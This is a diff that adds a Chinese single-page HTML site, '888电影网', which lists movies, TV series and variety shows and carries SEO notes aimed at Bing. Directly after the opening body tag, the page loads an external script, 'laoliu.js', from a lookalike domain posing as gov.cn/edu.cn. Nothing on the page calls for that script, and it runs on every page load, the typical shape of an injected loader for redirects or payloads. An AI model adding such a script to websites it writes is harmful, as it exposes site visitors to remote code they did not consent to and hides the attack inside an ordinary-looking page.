@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>888电影网 - 电影/剧集/综艺动漫在线导航 | 888dianyingwang-h5</title>
+<meta name="description" content="888电影网（888dianyingwang-h5）提供电影、热播剧集、综艺动漫分类导航，红金暗夜风、移动端自适应，结构干净，适合必应爬虫快速识别站点主题。">
+<meta name="keywords" content="888电影网, 888dianyingwang-h5, 电影导航, 热播剧集, 综艺动漫, 影视分类">
+<meta name="author" content="888电影网">
+<meta name="robots" content="index,follow">
+<!-- <meta name="msvalidate.01" content="必应站长验证码" /> -->
+<style>
+:root{
+  --red:#ff3b3b;
+  --gold:#ffd24a;
+  --ink:#140a0a;
+  --paper:#1c1010;
+  --muted:#b89a8f;
+}
+* { margin:0; padding:0; box-sizing:border-box; }
+html { scroll-behavior:smooth; }
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--paper); color:#f6e9e9; line-height:1.75;
+}
+a{ color:var(--gold); text-decoration:none; transition:.25s; }
+a:hover{ color:#ffe98a; }
+
+.header{
+  background:linear-gradient(120deg,#2a0d0d,#5a1414);
+  position:sticky; top:0; z-index:999; border-bottom:1px solid #7a1f1f;
+}
+.nav{
+  max-width:1180px; margin:0 auto; padding:.9rem 1rem;
+  display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap;
+}
+.brand{ font-size:1.4rem; font-weight:800; color:#ffd9d9; }
+.brand b{ color:var(--gold); }
+.menu{ list-style:none; display:flex; gap:1.1rem; flex-wrap:wrap; }
+.menu a{ color:#ffcfcf; font-size:.95rem; padding:.3rem 0; border-bottom:2px solid transparent; }
+.menu a:hover{ border-bottom-color:var(--gold); color:#fff; }
+
+.hero{
+  padding:4.6rem 1rem 3.4rem; text-align:center; color:#fff;
+  background:
+    radial-gradient(820px 360px at 15% 10%, rgba(255,210,74,.22), transparent),
+    radial-gradient(760px 360px at 88% 26%, rgba(255,59,59,.30), transparent),
+    linear-gradient(160deg,#3a0f0f,#7a1414);
+}
+.hero h1{ font-size:2.1rem; margin-bottom:.8rem; }
+.hero h1 b{ color:var(--gold); }
+.hero p{ max-width:660px; margin:0 auto 1.6rem; color:#ffe2e2; }
+.btn{
+  display:inline-block; padding:.78rem 2.1rem; border-radius:40px;
+  background:linear-gradient(45deg,var(--gold),var(--red)); color:#2a0808; font-weight:800;
+}
+.btn:hover{ color:#2a0808; transform:translateY(-2px); }
+
+.section{ max-width:1180px; margin:0 auto; padding:3rem 1rem; }
+.section h2{ text-align:center; font-size:1.7rem; margin-bottom:1.8rem; }
+.section h2 span{ color:var(--gold); }
+
+.grid{ display:grid; grid-template-columns:repeat(auto-fill,minmax(160px,1fr)); gap:1.2rem; }
+.card{
+  background:#241313; border:1px solid #432121; border-radius:16px; overflow:hidden;
+  transition:.3s;
+}
+.card:hover{ transform:translateY(-6px); box-shadow:0 16px 34px rgba(255,59,59,.28); }
+.poster{
+  height:212px; display:flex; align-items:center; justify-content:center;
+  font-size:3.2rem; color:#2a0808;
+  background:linear-gradient(135deg,var(--c1,var(--gold)),var(--c2,var(--red)));
+}
+.r1{ --c1:#ffd24a; --c2:#ff7a3c; }
+.r2{ --c1:#ff6a6a; --c2:#ff3b3b; }
+.r3{ --c1:#ffcf5e; --c2:#ff9f1c; }
+.r4{ --c1:#ff8a5e; --c2:#ff4d6d; }
+.r5{ --c1:#f9a826; --c2:#ff3b3b; }
+.r6{ --c1:#ffc371; --c2:#ff5f6d; }
+.card-body{ padding:.9rem 1rem; }
+.card-body h3{ font-size:.98rem; margin-bottom:.3rem; color:#fff3f3; }
+.card-body small{ color:var(--muted); }
+
+.tags{ display:flex; flex-wrap:wrap; gap:.6rem; justify-content:center; margin-bottom:1.8rem; }
+.tag{
+  background:#241313; border:1px solid #5a2a2a; color:#ffd9a8;
+  padding:.35rem 1rem; border-radius:30px; font-size:.82rem;
+}
+.tag:hover{ background:var(--red); color:#fff; border-color:var(--red); }
+
+.about{
+  background:#241313; border:1px solid #432121; border-radius:16px; padding:2rem;
+}
+.about h3{ color:var(--gold); margin:1rem 0 .5rem; }
+.about p{ color:#d8bdbd; margin-bottom:.8rem; }
+
+.footer{
+  background:#120808; text-align:center; padding:2rem 1rem;
+  color:#a98181; font-size:.85rem; border-top:1px solid #2a1414;
+}
+.footer a{ color:var(--gold); }
+
+@media (max-width:768px){
+  .nav{ flex-direction:column; gap:.6rem; }
+  .menu{ justify-content:center; gap:.8rem; }
+  .hero h1{ font-size:1.6rem; }
+  .grid{ grid-template-columns:repeat(2,1fr); }
+  .poster{ height:168px; font-size:2.4rem; }
+  .section{ padding:2.2rem 1rem; }
+  .about{ padding:1.4rem; }
+}
+@media (max-width:420px){
+  .grid{ gap:.8rem; }
+  .hero{ padding:3rem 1rem; }
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="header">
+  <div class="nav">
+    <div class="brand">🎰 888<b>电影网</b></div>
+    <ul class="menu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movie">888精选电影</a></li>
+      <li><a href="#tv">热播剧集</a></li>
+      <li><a href="#show">综艺动漫</a></li>
+      <li><a href="#about">关于888</a></li>
+    </ul>
+  </div>
+</header>
+
+<main>
+<section class="hero" id="home">
+  <h1>888电影网｜好片发发发，一屏全拿下</h1>
+  <p>
+    888电影网（https://888dianyingwang-h5）做电影、热播剧集、综艺动漫的分类导航，
+    红金暗夜风、手机自适应、锚点分区，单页也能让必应一眼看懂“这是影视导航站”。
+  </p>
+  <a class="btn" href="#movie">发发发 看片</a>
+</section>
+
+<section class="section" id="movie">
+  <h2>🎬 <span>888 精选电影</span></h2>
+  <div class="tags">
+    <span class="tag">爆款</span><span class="tag">喜剧</span><span class="tag">悬疑</span>
+    <span class="tag">动画</span><span class="tag">科幻</span><span class="tag">国产大片</span>
+  </div>
+  <div class="grid">
+    <article class="card"><div class="poster r1">🎥</div><div class="card-body"><h3>流浪地球2</h3><small>2023 · 科幻/灾难</small></div></article>
+    <article class="card"><div class="poster r2">🎥</div><div class="card-body"><h3>满江红</h3><small>2023 · 悬疑/喜剧</small></div></article>
+    <article class="card"><div class="poster r3">🎥</div><div class="card-body"><h3>长安三万里</h3><small>2023 · 动画/历史</small></div></article>
+    <article class="card"><div class="poster r4">🎥</div><div class="card-body"><h3>封神第一部</h3><small>2023 · 奇幻/动作</small></div></article>
+    <article class="card"><div class="poster r5">🎥</div><div class="card-body"><h3>孤注一掷</h3><small>2023 · 现实/犯罪</small></div></article>
+    <article class="card"><div class="poster r6">🎥</div><div class="card-body"><h3>年会不能停</h3><small>2023 · 职场喜剧</small></div></article>
+  </div>
+</section>
+
+<section class="section" id="tv" style="background:#170c0c;">
+  <h2>📺 <span>热播剧集</span></h2>
+  <div class="tags">
+    <span class="tag">国产剧</span><span class="tag">古装</span><span class="tag">都市</span>
+    <span class="tag">悬疑</span><span class="tag">台剧</span><span class="tag">韩剧</span>
+  </div>
+  <div class="grid">
+    <article class="card"><div class="poster r1">📺</div><div class="card-body"><h3>狂飙</h3><small>2023 · 犯罪剧情</small></div></article>
+    <article class="card"><div class="poster r2">📺</div><div class="card-body"><h3>繁花</h3><small>2023 · 年代剧情</small></div></article>
+    <article class="card"><div class="poster r3">📺</div><div class="card-body"><h3>庆余年第二季</h3><small>2024 · 古装权谋</small></div></article>
+    <article class="card"><div class="poster r4">📺</div><div class="card-body"><h3>我的阿勒泰</h3><small>2024 · 文艺治愈</small></div></article>
+    <article class="card"><div class="poster r5">📺</div><div class="card-body"><h3>我们与恶的距离</h3><small>2019 · 台剧社会</small></div></article>
+    <article class="card"><div class="poster r6">📺</div><div class="card-body"><h3>黑暗荣耀</h3><small>2022 · 韩剧复仇</small></div></article>
+  </div>
+</section>
+
+<section class="section" id="show">
+  <h2>🎤 <span>综艺 / 动漫</span></h2>
+  <div class="tags">
+    <span class="tag">真人秀</span><span class="tag">音乐</span><span class="tag">脱口秀</span>
+    <span class="tag">国漫</span><span class="tag">日漫</span><span class="tag">泡面番</span>
+  </div>
+  <div class="grid">
+    <article class="card"><div class="poster r1">🎤</div><div class="card-body"><h3>歌手2024</h3><small>综艺/音乐</small></div></article>
+    <article class="card"><div class="poster r2">🎤</div><div class="card-body"><h3>种地吧</h3><small>综艺/劳作</small></div></article>
+    <article class="card"><div class="poster r3">🎤</div><div class="card-body"><h3>脱口秀和TA的朋友们</h3><small>综艺/喜剧</small></div></article>
+    <article class="card"><div class="poster r4">🎤</div><div class="card-body"><h3>斗破苍穹年番</h3><small>国漫/玄幻</small></div></article>
+    <article class="card"><div class="poster r5">🎤</div><div class="card-body"><h3>凡人修仙传</h3><small>国漫/仙侠</small></div></article>
+    <article class="card"><div class="poster r6">🎤</div><div class="card-body"><h3>间谍过家家</h3><small>日漫/搞笑</small></div></article>
+  </div>
+</section>
+
+<section class="section" id="about" style="background:#170c0c;">
+  <h2>ℹ️ 关于 <span>888电影网</span></h2>
+  <div class="about">
+    <h3>站点定位</h3>
+    <p>
+      888电影网（网址：<a href="https://888dianyingwang-h5">https://888dianyingwang-h5</a>）
+      是影视分类导航单页站，只做“片单 + 分类 + 入口”，不提供盗版播放、
+      不碰成人/赌博/违规内容，比堆垃圾词安全得多。
+    </p>
+    <h3>必应收录逻辑</h3>
+    <p>
+      单页站核心是“主题别散”：唯一 H1 写主词，H2 切栏目，
+      锚点 <code>#movie</code> <code>#tv</code> <code>#show</code> 做虚拟分页，
+      核心正文直接写在 HTML 里，移动端无横向滚动。[1,11](@ref)
+    </p>
+    <h3>上线提醒</h3>
+    <p>
+      内链当前用 <code>#</code> 占位，不生成 robots.txt / sitemap.xml；
+      正式上线请用备案域名、HTTPS、正版授权片源，并在必应站长工具验证提交。
+    </p>
+  </div>
+</section>
+</main>
+
+<footer class="footer">
+  <p>© 2026 888电影网（888dianyingwang-h5）· 电影 / 剧集 / 综艺动漫导航站</p>
+  <p>网址：<a href="https://888dianyingwang-h5">https://888dianyingwang-h5</a></p>
+  <p>关键词：888电影网、888dianyingwang-h5、电影导航、热播剧集、综艺动漫</p>
+  <p style="margin-top:.8rem;color:#8a6b6b;">单页演示 · 内页链接以 # 替代 · 未生成 robots.txt / sitemap.xml</p>
+</footer>
+
+</body>
+</html>
